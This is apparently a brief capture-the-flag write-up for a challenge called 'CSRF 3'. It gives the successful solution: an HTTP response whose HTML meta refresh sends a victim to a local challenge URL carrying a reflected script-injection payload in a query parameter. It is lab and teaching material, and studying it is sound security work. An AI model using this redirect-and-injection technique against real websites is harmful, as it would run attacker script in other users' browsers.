# CSRF 3

#### Tried a few different approaches and this is the one that succeeded:
```
HTTP/1.1 200 OK
Content-type: text/html

<html>
  <head>
	  <meta http-equiv="refresh" content="0; url=http://challenge.localhost/ephemeral?msg=<script>alert('PWNED')</script>">
  </head>
</html>
```
